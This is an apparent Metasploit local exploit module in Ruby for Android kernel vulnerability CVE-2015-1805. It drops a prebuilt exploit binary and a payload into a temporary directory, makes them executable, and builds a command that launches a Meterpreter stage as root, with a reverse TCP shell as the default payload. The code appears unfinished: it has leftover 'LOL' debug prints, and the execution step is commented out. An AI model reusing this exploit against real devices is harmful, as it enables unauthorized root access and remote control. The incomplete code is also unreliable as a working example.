##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Common

  def initialize(info={})
    super( update_info( info, {
        'Name'          => "Android CVE-2015-1805 Kernel Exploit",
        'Description'   => %q{
            This module exploits CVE-2015-1805 in the Android kernel to gain root access.
            This was original in April 2014, however the patches were only applied to
            Android until February 2015.
            This vulnerability is present on all unpatched Android devices running kernels
            3.4, 3.10 and 3.14, however this exploit only contains the correct offsets for 
            a small subset of these devices.
            Devices with kernel 3.18 or higher are not vulnerable.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [
            'idler1984',
            'dosomder',
            'timwr'       # metasploit module
        ],
        'References'    =>
        [
            [ 'CVE', '2015-1805' ],
            [ 'URL', 'https://source.android.com/security/advisory/2016-03-18.html' ],
        ],
        'SessionTypes'  => [ 'meterpreter' ],
        'Platform'       => 'android',
        'Targets'        => [[ 'Automatic', { }]],
        'Arch'           => ARCH_DALVIK,
        'DefaultOptions' =>
          {
            'PAYLOAD'  => 'android/meterpreter/reverse_tcp',
          },
        'DefaultTarget' => 0,
        'DisclosureDate' => "April 03 2014"
      }
    ))

    register_options([
        OptString.new("WritableDir", [ true, "Temporary directory to write files", "/data/local/tmp/" ]),
    ], self.class)
  end

  def put_local_file(remotefile)
    localfile = File.join( Msf::Config.data_directory, "exploits", "CVE-2015-1805.elf" )
    data = File.read(localfile, {:mode => 'rb'})
    write_file(remotefile, data)
  end

  def exploit
    workingdir = session.fs.dir.getwd
    exploitfile = "#{workingdir}/#{Rex::Text::rand_text_alpha_lower(5)}"
    payloadfile = "#{workingdir}/#{Rex::Text::rand_text_alpha_lower(5)}"

    put_local_file(exploitfile)
    cmd_exec('/system/bin/chmod 777 ' + exploitfile)
    write_file(payloadfile, payload.raw)

    tmpdir = datastore['WritableDir']
    rootclassdir = "#{tmpdir}#{Rex::Text::rand_text_alpha_lower(5)}"
    rootpayload = "#{tmpdir}#{Rex::Text::rand_text_alpha_lower(5)}.jar"

    rootcmd = " mkdir #{rootclassdir} && "
    rootcmd += "cd #{rootclassdir} && "
    rootcmd += "cp " + payloadfile + " #{rootpayload} && "
    rootcmd += "chmod 766 #{rootpayload} && "
    rootcmd += "dalvikvm -Xbootclasspath:/system/framework/core.jar -cp #{rootpayload} com.metasploit.stage.Payload"

    puts "LOL" + exploitfile
    puts "LOL" + rootcmd

    #puts "LOL0"
    #process = session.sys.process.execute(exploitfile, rootcmd, {'Hidden' => true, 'Channelized' => true})
    #puts "LOL1"
    #process.channel.read
    #puts "LOL2"
  end

end

